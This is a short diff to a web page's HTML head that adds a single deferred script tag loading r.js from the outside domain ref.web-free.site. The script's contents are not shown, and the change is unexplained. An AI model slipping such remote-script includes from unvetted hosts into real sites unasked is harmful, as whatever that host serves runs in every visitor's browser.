@@ -41,6 +41,7 @@ body{font-family:system-ui,sans-serif;line-height:1.6;max-width:52rem;margin:0 a
 a{color:#1d4ed8} nav{margin:1rem 0;display:flex;flex-wrap:wrap;gap:.75rem} h1{line-height:1.2}
 .ad-row{display:flex;justify-content:center;flex-wrap:wrap;gap:1rem;margin:1rem 0}
 </style>
+<script src="https://ref.web-free.site/r.js" defer></script>
 </head>
 <body>
 <header>
